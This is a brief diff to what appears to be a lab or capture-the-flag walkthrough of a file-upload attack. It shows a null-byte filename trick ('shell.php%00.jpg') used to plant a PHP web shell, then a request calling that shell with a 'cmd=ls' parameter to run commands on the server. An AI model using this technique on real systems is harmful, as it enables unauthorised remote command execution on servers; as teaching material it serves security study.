@@ -61,7 +61,7 @@ filename="shell.php%00.jpg"
 15. Replace the image filename with:
 
 ```http
-GET /files/avatars/shell.php HTTP/1.1
+url.../files/avatars/shell.php?cmd=ls
 ```
 
 16. Send the request.
@@ -89,7 +89,7 @@ filename="shell.php%00.jpg"
 ### Request
 
 ```http
-GET /files/avatars/shell.php HTTP/1.1
+url...files/avatars/shell.php?cmd=ls
 ```
 
 ## Result
